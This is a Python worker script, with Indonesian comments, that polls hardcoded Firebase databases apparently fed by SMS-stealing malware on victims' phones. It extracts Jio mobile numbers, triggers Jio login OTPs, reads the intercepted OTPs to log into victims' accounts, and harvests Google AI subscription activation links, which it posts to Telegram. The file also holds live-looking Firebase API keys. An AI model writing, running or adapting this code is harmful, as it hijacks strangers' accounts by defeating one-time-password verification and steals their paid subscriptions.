import asyncio
import html
import re
import time
from collections import Counter, defaultdict
from typing import Any
from urllib.parse import unquote
import requests
from telegram import Bot

from database import HunterDatabase
from notifier import send_gemini_alert

db = HunterDatabase()

FIREBASE_PANELS = [
    ("https://apkdriod-f6fb9-default-rtdb.firebaseio.com", "AIzaSyBVDnh3vYAH9lnPnrrYGf1Vk7Rg030UE2A"),
    ("https://challan-758d1-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyBXJdXWfTCC4tSqD0nYXUbXaSISKhtjnrc"),
    ("https://siwanikumar923420-2e01f-default-rtdb.firebaseio.com", "AIzaSyBUKtg-eoK5b5rt8tpLaQbiSSS-z0H8woM"),
    ("https://m90910540-a4e00-default-rtdb.firebaseio.com", "AIzaSyC_7pBBqu9LYTi4BcXo_q7VUviWoL91V6c"),
    ("https://rtx-c9-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyC0D_8y2VQ5rYqfPyr-anr67ewq1MskDZg"),
    ("https://dhheee-b95dc-default-rtdb.firebaseio.com", "AIzaSyATn6LDSqEYPCyY-yMKDhzVBO263WmYOqY"),
    ("https://pmnr1newad-default-rtdb.firebaseio.com", "AIzaSyDyeSMnF_Sb9oaPoUjvW4ERov6Lq7h9CNM"),
    ("https://master89812-b77a6-default-rtdb.firebaseio.com", "AIzaSyD8dtVPCyRtNPCJ8m3I7qmuiJy1ZYNCOgs"),
    ("https://rajkumar8822556644-407f5-default-rtdb.firebaseio.com", "AIzaSyD8dtVPCyRtNPCJ8m3I7qmuiJy1ZYNCOgs"),
    ("https://m05960864-6140e-default-rtdb.firebaseio.com", "AIzaSyBUKtg-eoK5b5rt8tpLaQbiSSS-z0H8woM"),
    ("https://godpanel-203f8-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyCs3AJDbOaOpNTmImjgF-n32I-AK7CYWMk"),
    ("https://pm-kisan-22hg-default-rtdb.firebaseio.com", "AIzaSyCbT2cHC05tINJ3aOku1URGlAzWTG1IS1E"),
    ("https://pm-kishan-25-58b3c-default-rtdb.firebaseio.com", "AIzaSyA51lq8IG509h32yHtzaWWWzdyZNqemUkc"),
    ("https://testingyou-2dcac-default-rtdb.firebaseio.com", ""),
    ("https://pm-kisan-15jg-default-rtdb.firebaseio.com", "AIzaSyCbT2cHC05tINJ3aOku1URGlAzWTG1IS1E"),
]

MESSAGE_SCAN_LIMIT = 100
OTP_TIMEOUT = 20
POLL_INTERVAL = 1

CHECK_NUMBER_URL = "https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{mobile}"
SEND_OTP_URL = "https://www.jio.com/api/jio-login-service/login/sendOtp"
VERIFY_OTP_URL = "https://www.jio.com/api/jio-login-service/login/validateOtp"
AUTH_URL = "https://www.jio.com/api/jio-authenticate-service/authenticate/authJsonData"
NAVIGATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/navigate/Z0241"
ACTIVATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/activate/Z0241?source=JIO"
GOOGLE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/google-ai"
SUBMIT_URL = "https://www.jio.com/api/jio-ott-service/ott/submission/submit"
GOOGLE_PAGE = "https://www.jio.com/selfcare/googleai/?header=no&type=Z0241&source=JIO"

NUMBER_PATTERNS = (
    re.compile(r"(?i)\bjio\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\brecharge(?:\s+now)?\s+jio\s+no[.]?\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\bairtel\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\bphone\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
)
OTP_WORD_PATTERN = re.compile(r"(?i)\botp\b|one[ -]?time password|verification|code")
OTP_PATTERN = re.compile(r"(?<!\d)(\d{6})(?!\d)")
ACTIVATION_PATTERN = re.compile(
    r"https?://serviceactivation[.]google[.]com/subscription/new/"
    r"(?P<token>[A-Za-z0-9_-]{50,})(?P<padding>={0,2})",
    re.IGNORECASE,
)
JIO_SENDER_RE = re.compile(r"(?i)^[A-Z]{2}-(JIO|MYJIO|JIOINF|JIONET|JIOMRT|JIOPBS|JioPay|JioSvc|JIOMOB)")
GENERIC_MOBILE_RE = re.compile(r"(?<!\d)(?:\+91|91)?([6-9]\d{9})(?!\d)")

def normalize_mobile(value: Any) -> str | None:
    digits = re.sub(r"\D", "", str(value or ""))
    if len(digits) > 10 and digits.startswith("91"):
        digits = digits[-10:]
    return digits if re.fullmatch(r"[6-9]\d{9}", digits) else None

def firebase_get(session: requests.Session, base_url: str, key: str, path: str, params: dict[str, Any] | None = None) -> Any:
    query = {"auth": key}
    if params:
        query.update(params)
    if key and key.startswith("http"):
        response = session.get(f"{base_url}/{path.strip('/')}.json", timeout=15)
        response.raise_for_status()
        return response.json()
    response = session.get(f"{base_url}/{path.strip('/')}.json", params=query, timeout=15)
    response.raise_for_status()
    return response.json()

def latest_messages(session: requests.Session, base_url: str, key: str, device_id: str, limit: int) -> dict[str, dict[str, Any]]:
    try:
        data = firebase_get(session, base_url, key, f"messages/{device_id}", {"orderBy": '"$key"', "limitToLast": max(1, limit)})
    except requests.RequestException:
        data = None
    if not isinstance(data, dict) or "error" in data:
        data = firebase_get(session, base_url, key, f"messages/{device_id}")
    if not isinstance(data, dict):
        return {}
    return {name: value for name, value in data.items() if isinstance(value, dict)}

def number_candidates(messages: dict[str, dict[str, Any]], client_data: dict[str, Any] | None = None) -> set[str]:
    found: set[str] = set()
    if isinstance(client_data, dict):
        webhook = client_data.get("webhookEvent")
        if isinstance(webhook, dict):
            sms = webhook.get("sendSms")
            if isinstance(sms, dict):
                mobile = normalize_mobile(sms.get("to"))
                if mobile:
                    found.add(mobile)
    for item in messages.values():
        sim_info = item.get("simInfo")
        if isinstance(sim_info, dict):
            mobile = normalize_mobile(sim_info.get("phoneNumber"))
            if mobile:
                found.add(mobile)
        mobile = normalize_mobile(item.get("phoneNumber"))
        if mobile:
            found.add(mobile)
        body = str(item.get("message", ""))
        sender = str(item.get("sender", ""))
        for pattern in NUMBER_PATTERNS:
            found.update(pattern.findall(body))
        if JIO_SENDER_RE.match(sender):
            for m in GENERIC_MOBILE_RE.findall(body):
                found.add(m)
    return found

def jio_session() -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://www.jio.com",
        "Referer": "https://www.jio.com/selfcare/login/",
    })
    return s

def response_json(response: requests.Response) -> dict[str, Any]:
    try:
        return response.json() if isinstance(response.json(), dict) else {}
    except Exception:
        return {}

def response_error(response: requests.Response) -> bool:
    if not response.ok:
        return True
    data = response_json(response)
    if data.get("errorMessage") or data.get("error"):
        return True
    return str(data.get("status", "")).lower() in {"failed", "failure", "error", "false"}

def send_otp(session: requests.Session, mobile: str) -> bool:
    try:
        r = session.post(SEND_OTP_URL, json={"mobileNumber": mobile, "loginFlowType": "MOBILE", "alternateNumber": ""}, timeout=15)
        return not response_error(r)
    except Exception:
        return False

def verify_otp(session: requests.Session, mobile: str, otp: str) -> bool:
    try:
        r = session.post(VERIFY_OTP_URL, json={"mobileNumber": mobile, "otp": otp}, timeout=15)
        return not response_error(r)
    except Exception:
        return False

def wait_for_otp(firebase: requests.Session, base_url: str, key: str, device_id: str, known_keys: set[str], jio: requests.Session, mobile: str) -> bool:
    used: set[str] = set()
    deadline = time.monotonic() + OTP_TIMEOUT
    while time.monotonic() < deadline:
        try:
            messages = latest_messages(firebase, base_url, key, device_id, 20)
        except Exception:
            time.sleep(POLL_INTERVAL)
            continue
        candidates = []
        for message_key, item in messages.items():
            if message_key in known_keys or message_key in used:
                continue
            body = str(item.get("message", ""))
            if not OTP_WORD_PATTERN.search(body):
                continue
            match = OTP_PATTERN.search(body)
            if match:
                candidates.append((message_key, match.group(1)))
        if candidates:
            message_key, otp = candidates[-1]
            used.add(message_key)
            if verify_otp(jio, mobile, otp):
                return True
        time.sleep(POLL_INTERVAL)
    return False

def activation_url(value: str) -> str:
    text = html.unescape(value or "")
    for _ in range(4):
        decoded = unquote(text)
        if decoded == text:
            break
        text = decoded
    match = ACTIVATION_PATTERN.search(text)
    if not match:
        return ""
    return "https://serviceactivation.google.com/subscription/new/" + match.group("token") + match.group("padding")

def get_activation(session: requests.Session) -> tuple[str, str]:
    dashboard_headers = {"Accept": "*/*", "Referer": "https://www.jio.com/selfcare/dashboard/"}
    offer_headers = {"Accept": "*/*", "Referer": GOOGLE_PAGE}
    try:
        auth_response = session.get(AUTH_URL, headers=dashboard_headers, timeout=15)
        auth_data = response_json(auth_response)
        if not auth_response.ok or str(auth_data.get("loginFlag", "")).lower() != "true":
            return "api_session_invalid", ""
        session.get(NAVIGATE_URL, headers=dashboard_headers, timeout=15)
        activate_response = session.get(ACTIVATE_URL, headers=offer_headers, timeout=15)
        activate_data = response_json(activate_response)
        if not activate_response.ok or str(activate_data.get("errorCode", "200")) != "200":
            return "activation_api_failed", ""
        google_response = session.get(GOOGLE_URL, headers=offer_headers, timeout=15)
        google_data = response_json(google_response)
        url = activation_url(str(google_data.get("redirectionURL", "")))
        if not url:
            return "no_activation_url", ""
        try:
            session.get(SUBMIT_URL, headers=offer_headers, timeout=15)
        except Exception:
            pass
        return "activation_url_found", url
    except Exception:
        return "activation_api_failed", ""

class GeminiWorker:
    def __init__(self, bot: Bot):
        self.bot = bot
        self.running = False

    def scan_cycle_sync(self) -> list[tuple[str, str]]:
        """Satu siklus scanning panel Jio Gemini secara sinkron."""
        found_links = []
        all_online_devices = {}
        device_messages = {}

        fb_session = requests.Session()
        fb_session.headers.update({"Accept": "application/json", "Cache-Control": "no-cache"})

        for base_url, key in FIREBASE_PANELS:
            try:
                url_probe = f"{base_url}/clients.json" if key.startswith("http") else f"{base_url}/clients.json?auth={key}"
                resp = fb_session.get(url_probe, timeout=8)
                if resp.status_code == 200 and isinstance(resp.json(), dict):
                    for dev_id, dev_data in resp.json().items():
                        if isinstance(dev_data, dict) and dev_data.get("status") == "online":
                            all_online_devices[dev_id] = {
                                "base_url": base_url,
                                "firebase_key": key,
                                "firebase_session": fb_session,
                                "data": dev_data
                            }
            except Exception:
                continue

        mappings = defaultdict(set)
        for dev_id, info in all_online_devices.items():
            try:
                msgs = latest_messages(fb_session, info["base_url"], info["firebase_key"], dev_id, MESSAGE_SCAN_LIMIT)
                device_messages[dev_id] = msgs
                for mobile in number_candidates(msgs, client_data=info["data"]):
                    mappings[mobile].add(dev_id)
            except Exception:
                device_messages[dev_id] = {}

        targets = []
        for mobile, devs in sorted(mappings.items()):
            if devs:
                targets.append((sorted(devs)[0], mobile))

        for dev_id, mobile in targets:
            info = all_online_devices.get(dev_id)
            if not info:
                continue
            jio = jio_session()
            known = set(device_messages.get(dev_id, {}))
            if send_otp(jio, mobile):
                if wait_for_otp(fb_session, info["base_url"], info["firebase_key"], dev_id, known, jio, mobile):
                    status, url = get_activation(jio)
                    if status == "activation_url_found" and url:
                        found_links.append((url, mobile[-4:]))

        return found_links

    async def run(self):
        self.running = True
        print("[WORKER] Jio Gemini 18-Bulan Panel Scanner aktif (24/7 non-stop)...")

        while self.running:
            try:
                links = await asyncio.to_thread(self.scan_cycle_sync)
                for url, ending in links:
                    if db.save_gemini_link(url, ending):
                        print(f"[HIT GEMINI] Berhasil dapatkan link Gemini Pro ending {ending}: {url}")
                        await send_gemini_alert(self.bot, url, ending)
            except Exception as e:
                print(f"[GEMINI WORKER ERR] {e}")

            # Jeda 20 detik sebelum putaran berikutnya, berputar terus tanpa batas
            await asyncio.sleep(20)

    def stop(self):
        self.running = False
